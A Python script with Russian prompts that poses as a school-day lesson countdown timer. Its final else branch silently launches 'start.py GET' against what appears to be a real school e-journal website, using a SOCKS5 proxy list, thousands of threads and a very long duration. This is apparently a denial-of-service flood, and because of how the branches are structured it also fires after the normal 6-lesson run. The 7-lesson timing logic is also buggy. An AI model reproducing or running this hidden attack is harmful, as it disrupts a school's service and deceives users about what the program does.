import os
import time

os.system("clear") 
os.system("figlet 'Created by Wemis'|lolcat")


alltime6=19800
alltime7=23100


lessons=int(input("Уроков(6/7) ")) 
if lessons==6:
	lesson1=input("Урок 1 ") 
	lesson2=input("Урок 2 ") 
	lesson3=input("Урок 3 ") 
	lesson4=input("Урок 4 ") 
	lesson5=input("Урок 5 ") 
	lesson6=input("Урок 6 ") 
	timel=19800
	while True:
		os.system("clear") 
		print("[*] Осталось секунд:", timel) 
		print("[*] Осталось минут:", int(timel/60))
		print("[*] Осталось часов:", round(timel/3600, 1)) 
		print("[*] DAY COMPLETE ",round(100-timel/alltime6*100, 2),"%")
		timel-=1
		time.sleep(1) 
		if timel > 17100:
			print("[*] Осталось уроков: 6") 
			print("[*] Сейчас урок: ",lesson1) 
			print("[*] Следующий урок:", lesson2) 
		if timel < 17100:
			print("[*] Осталось уроков: 5") 
			print("[*] Сейчас урок:", lesson2) 
			print("[*] Следующий урок:", lesson3)
		if timel < 13500:
			print("[*] Осталось уроков: 4") 
			print("[*] Сейчас урок: ",lesson3) 
			print("[*] Следующий урок:", lesson4) 
		if timel < 10200:
			print("[*] Осталось уроков: 3") 
			print("[*] Сейчас урок:", lesson4) 
			print("[*] Следующий урок:", lesson5)
		if timel < 6600:
			print("[*] Осталось уроков: 2") 
			print("[*] Сейчас урок: ",lesson5) 
			print("[*] Следующий урок:", lesson6) 
		if timel < 3300:
			print("[*] Осталось уроков: 1") 
			print("[*] Сейчас урок:", lesson6) 
		if timel==-1:
			break
	print("[✅] day complete! ") 

if lessons==7:
	lesson1=input("Урок 1 ") 
	lesson2=input("Урок 2 ") 
	lesson3=input("Урок 3 ") 
	lesson4=input("Урок 4 ") 
	lesson5=input("Урок 5 ") 
	lesson6=input("Урок 6 ") 
	lesson7=input("Урок 7 ") 
	timel=23100
	while True:
		os.system("clear") 
		print("[*] Осталось секунд:", timel) 
		print("[*] Осталось минут:", int(timel/60))
		print("[*] Осталось часов:", round(timel/3600, 1)) 
		print("[*] DAY COMPLETE ",round(100-timel/alltime7*100, 2),"%") 
		timel-=1
		time.sleep(1) 
		if timel > 23100-2700:
			print("[*] Осталось уроков: 7") 
			print("[*] Сейчас урок: ",lesson1) 
			print("[*] Следующий урок:", lesson2) 
		if timel < 23100-2700:
			print("[*] Осталось уроков: 6") 
			print("[*] Сейчас урок: ",lesson2) 
			print("[*] Следующий урок:", lesson3) 
		if timel > 23100-2700-3600:
			print("[*] Осталось уроков: 5") 
			print("[*] Сейчас урок: ",lesson3) 
			print("[*] Следующий урок:", lesson4) 
		if timel > 23100-2700-3600-3300:
			print("[*] Осталось уроков: 6") 
			print("[*] Сейчас урок: ",lesson4) 
			print("[*] Следующий урок:", lesson5) 
		if timel > 23100-2700-3600-3300-3600:
			print("[*] Осталось уроков: 6") 
			print("[*] Сейчас урок: ",lesson5) 
			print("[*] Следующий урок:", lesson6) 
		if timel > 23100-2700-3600-3300-3600-3300:
			print("[*] Осталось уроков: 6") 
			print("[*] Сейчас урок: ",lesson6) 
			print("[*] Следующий урок:", lesson7) 
		if timel > 23100-2700-3600-3300-3600-3300-3300:
			print("[*] Осталось уроков: 6") 
			print("[*] Сейчас урок: ",lesson7) 
		if timel==-1:
			break
	print(" [✅] day complete! ")

else:
	os.system(" python3 start.py GET https://romny-school4.e-schools.info/m/ 5 6000 socks5.txt 20 99999") 